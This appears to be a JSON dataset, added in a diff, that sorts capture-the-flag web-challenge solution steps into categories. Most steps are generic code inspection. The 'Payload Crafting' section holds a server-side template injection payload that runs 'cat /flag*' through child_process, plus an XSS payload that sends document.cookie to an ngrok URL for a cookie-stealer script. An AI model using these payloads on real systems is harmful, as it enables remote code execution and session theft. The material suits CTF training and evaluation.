@@ -1,0 +1,58 @@
+{
+    "Source Code Inspection": [
+        "Inspect 'challenge/routes/index.js' file for SSTI vulnerability.",
+        "Inspect 'challenge/helpers/CardHelper.js' file for SSTI vulnerability.",
+        "Inspect the source code of the website.",
+        "Review the source code in `database.sql` file again.",
+        "Inspect the `challenge/routes/index.js` file.",
+        "Reinspect the source code with attention to the user authentication process.",
+        "Examine the 'challenge/index.js' file in the source code zip.",
+        "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
+        "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
+        "Explore other files in the repo",
+        "Locate the file 'build_flag_checker.yml'",
+        "Analyze the contents of 'build_flag_checker.yml'",
+        "Open the 'build.sh' script referenced in the GitHub Actions file",
+        "Open the 'flaghash.sh' script",
+        "Investigate the GitHub Actions workflow runs",
+        "Investigate changes made in the 'Fix auth!!!' commit",
+        "Examined the website's '.git' folder",
+        "Inspected the 'flag.php' file and its history",
+        "Analyzed the source code for potential flaws"
+    ],
+    "Payload Crafting and Insertion": [
+        "Craft and insert the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}' into the exploit.",
+        "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'.",
+        "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
+        "Ensure that `$to_check` is assigned the value `0`.",
+        "Perform XOR operation between the uploaded file and `cipher + 0xd34db33f`.",
+        "Check if the XOR result is zero.",
+        "The if statement evaluates to true."
+    ],
+    "LaTeX Functionality": [
+        "Use the LaTeX function \\StrMid to isolate the '/' symbol.",
+        "Write a LaTeX script.",
+        "Define sections of the path to the flag.",
+        "Read index.html.",
+        "Isolate the '/' character.",
+        "Build the path to the flag."
+    ],
+    "Template Injection Analysis": [
+        "Inspect the render function",
+        "Determine that template injection is possible"
+    ],
+    "HTML and CSS Analysis": [
+        "Inspect the source HTML.",
+        "Search for comments within the style.css file",
+        "Identify the second part of the flag within a comment"
+    ],
+    "JavaScript Analysis": [
+        "Locate and open the JavaScript file",
+        "Find the desired location in the JavaScript file"
+    ],
+    "Flag and Authentication Analysis": [
+        "Find the source code file 'flagchecker.c' in the repo",
+        "Analyze the source code of 'flagchecker.c'",
+        "Analyze the process in the script: making a cURL request, hashing the results with MD5, and setting the 'auth' cookie to the value of 'FLAG_AUTH' from secrets"
+    ]
+}
